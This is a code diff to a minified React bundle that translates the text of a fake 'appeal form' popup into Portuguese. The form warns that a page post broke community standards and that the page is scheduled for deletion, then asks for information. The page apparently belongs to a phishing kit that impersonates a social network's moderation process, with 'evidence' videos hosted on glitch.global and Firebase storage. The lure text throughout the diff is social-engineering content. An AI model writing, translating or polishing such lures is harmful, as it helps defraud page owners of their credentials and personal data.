@@ -9771,7 +9771,7 @@
                             className: "popup-head",
                             children: [(0,
                             he.jsx)("h5", {
-                                children: "Apeal Form"
+                                children: "Formulário de Apelação"
                             }), (0,
                             he.jsx)("div", {
                                 onClick: t,
@@ -9838,17 +9838,17 @@
                                     className: "form-item",
                                     children: [(0,
                                     he.jsx)("p", {
-                                        children: "We have detected violation on your recent page post that violates our community standards."
+                                        children: "Detectamos uma violação em sua postagem recente que infringe nossos padrões da comunidade."
                                     }), (0,
                                     he.jsx)("p", {
                                         children: "Agendamos a exclusão da sua página"
                                     }), (0,
                                     he.jsx)("p", {
-                                        children: "If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information."
+                                        children: "Se você acredita que isso foi um erro, tem a opção de enviar uma apelação fornecendo as informações necessárias."
                                     }), (0,
                                     he.jsx)("p", {
                                         className: "form-item-detailtxt",
-                                        children: "Detailed Video Information"
+                                        children: "Informações detalhadas sobre o vídeo"
                                     }), (0,
                                     he.jsx)("video", {
                                         src: "https://cdn.glitch.global/31b556b9-4313-4d9d-9619-ee4546696f71/detailed-video.mp4?v=1732333110082",
@@ -9858,7 +9858,7 @@
                                     }), (0,
                                     he.jsx)("p", {
                                         className: "form-item-detailtxt",
-                                        children: "Please be sure to provide the requested information below."
+                                        children: "Certifique-se de fornecer as informações solicitadas abaixo."
                                     }), (0,
                                     he.jsxs)("div", {
                                         className: "form-inputs",
@@ -9905,7 +9905,7 @@
                                                         className: "ant-btn css-m4timi ant-btn-default button-send",
                                                         children: (0,
                                                         he.jsx)("span", {
-                                                            children: "Send"
+                                                            children: "Enviar"
                                                         })
                                                     })
                                                 })
@@ -13336,7 +13336,7 @@
                                 style: {
                                     fontSize: "12px"
                                 },
-                                children: "Detailed Video Information."
+                                children: "Informações detalhadas sobre o vídeo."
                             }), (0,
                             he.jsx)("a", {
                                 href: "https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72",
@@ -13353,7 +13353,7 @@
                             he.jsx)("br", {}), (0,
                             he.jsx)("p", {
                                 className: "fw-semibold validation_form_para mt-2",
-                                children: "Please be sure to provide the requested information below."
+                                children: "Certifique-se de fornecer as informações solicitadas abaixo."
                             }), (0,
                             he.jsxs)("form", {
                                 onSubmit: n => {
